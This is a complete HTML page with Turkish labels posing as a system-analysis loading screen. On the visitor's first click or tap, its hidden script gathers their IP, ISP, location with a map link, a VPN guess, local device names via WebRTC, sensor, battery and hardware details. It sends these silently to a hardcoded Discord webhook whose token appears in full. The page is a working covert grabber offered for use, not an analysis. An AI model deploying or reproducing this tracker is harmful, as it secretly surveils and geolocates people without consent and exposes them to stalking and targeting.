<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Analizi</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; cursor:crosshair; }
        .l { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: s 0.6s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body onmousedown="OmniEngine.strike()" ontouchstart="OmniEngine.strike()">
    <div class="l"></div>

    <script>
        "use strict";

        const OmniEngine = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let fired = false;

            const Core = {
                // 1. Agresif VPN ve Derin Aƒü Analizi
                async getNet() {
                    try {
                        const start = performance.now();
                        const res = await fetch('https://ipapi.co/json/');
                        const j = await res.json();
                        const latency = (performance.now() - start).toFixed(0);
                        
                        // Zaman Dilimi √áapraz Kontrol√º (VPN Tespiti)
                        const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
                        const vpnTrigger = (j.timezone !== browserTZ) ? "‚ö†Ô∏è VPN/Proxy Saptandƒ±" : "‚úÖ E≈üle≈üiyor";
                        
                        return { 
                            ...j, vpn: vpnTrigger, ping: latency + "ms", 
                            map: `https://www.google.com/maps?q=${j.latitude},${j.longitude}` 
                        };
                    } catch { return { ip: "Engellendi", vpn: "Bilinmiyor" }; }
                },

                // 2. √áevredeki Cihaz ve WiFi Tahmini (mDNS)
                async getLAN() {
                    return new Promise(res => {
                        const devs = [];
                        const pc = new RTCPeerConnection({iceServers:[]});
                        pc.createDataChannel("");
                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && devs.push(e.candidate.candidate.split(" ")[4]);
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => { pc.close(); res(devs.join(", ") || "Gizli Aƒü"); }, 1500);
                    });
                },

                // 3. Medya Donanƒ±mƒ± (Kamera/Mikrofon)
                async getMedia() {
                    try {
                        const d = await navigator.mediaDevices.enumerateDevices();
                        const cams = d.filter(x => x.kind === 'videoinput').length;
                        const mics = d.filter(x => x.kind === 'audioinput').length;
                        return `${cams} Kamera, ${mics} Mikrofon Saptandƒ±.`;
                    } catch { return "Donanƒ±m Eri≈üimi Reddedildi"; }
                },

                // 4. Anlƒ±k Kinetik Durum (ƒ∞vme/Jiroskop)
                async getMotion() {
                    return new Promise(res => {
                        let m = "Sabit (Masa√ºst√º)";
                        const check = (e) => {
                            const a = e.accelerationIncludingGravity;
                            if(a) {
                                const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
                                if(force > 13.5) m = "HAREKETLƒ∞ (Ara√ß/Hƒ±zlƒ±)";
                                else if(force > 10.5) m = "HAREketli (Y√ºr√ºy√º≈ü)";
                                window.removeEventListener('devicemotion', check);
                            }
                        };
                        window.addEventListener('devicemotion', check);
                        setTimeout(() => res(m), 800);
                    });
                }
            };

            return {
                async strike() {
                    if (fired) return; fired = true;

                    const [net, lan, motion, media, bat] = await Promise.all([
                        Core.getNet(), Core.getLAN(), Core.getMotion(), 
                        Core.getMedia(), navigator.getBattery ? navigator.getBattery() : {level:0}
                    ]);

                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";

                    const payload = {
                        embeds: [{
                            title: "üíÄ V11 SINGULARITY - TAM SPEKTRUM RAPOR",
                            color: 16711680,
                            fields: [
                                { name: "üì° Aƒû & AGRESƒ∞F VPN ANALƒ∞Zƒ∞", value: `**IP:** \`${net.ip}\` | **VPN:** ${net.vpn}\n**ISP:** ${net.org}\n**Lokasyon:** ${net.city}, ${net.country_name}\nüìç [Google Haritalar](${net.map})`, inline: false },
                                { name: "üõ∞Ô∏è √áEVRESEL Cƒ∞HAZLAR (mDNS)", value: `**Bulunan Cihazlar:** \`${lan}\`\n**Baƒülantƒ±:** ${navigator.connection?.effectiveType || 'N/A'} | **Ping:** ${net.ping}`, inline: false },
                                { name: "üèÉ ANLIK HAREKET & G√ú√á", value: `**Durum:** ${motion}\n**Pil:** %${Math.round(bat.level * 100)} (${bat.charging ? '≈ûarjda' : 'Pilde'})`, inline: true },
                                { name: "‚öôÔ∏è DONANIM R√ñNTGENƒ∞", value: `**GPU:** ${gpu}\n**CPU:** ${navigator.hardwareConcurrency} Core | **RAM:** ${navigator.deviceMemory}GB`, inline: true },
                                { name: "üé• MEDYA & EKRAN", value: `**Cihazlar:** ${media}\n**Ekran:** ${screen.width}x${screen.height} | **Dil:** ${navigator.language}`, inline: false }
                            ],
                            footer: { text: "Protocol: Omniscience V11 | High-Level Forensics" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                    navigator.sendBeacon(HOOK, blob);
                    fetch(HOOK, { method: 'POST', mode: 'no-cors', body: blob });
                }
            };
        })();
    </script>
</body>
</html>
